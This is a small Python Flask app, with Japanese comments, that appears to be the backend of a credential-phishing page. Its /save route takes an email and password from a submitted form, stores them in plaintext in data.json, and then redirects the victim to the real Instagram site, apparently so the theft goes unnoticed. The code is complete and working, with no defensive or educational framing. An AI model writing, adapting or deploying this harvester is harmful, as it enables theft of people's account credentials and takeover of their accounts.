from flask import Flask, render_template, request, redirect
import os
import json

app = Flask(__name__,)


@app.route('/')
def index():
    return render_template('index.html')

@app.route('/save', methods=['POST'])
def save_data():
    print("test1")
    email = request.form['email']
    password = request.form['password']
    
    # 受け取ったデータをJSON形式に整形
    data = {
        'email': email,
        'password': password
    }
    
    # JSONファイルにデータを書き込む
    with open('data.json', 'w') as file:
        json.dump(data, file)
    return redirect('https://www.instagram.com')


if __name__ == '__main__':
    app.run(debug=True, port=os.getenv("PORT", default=5000))
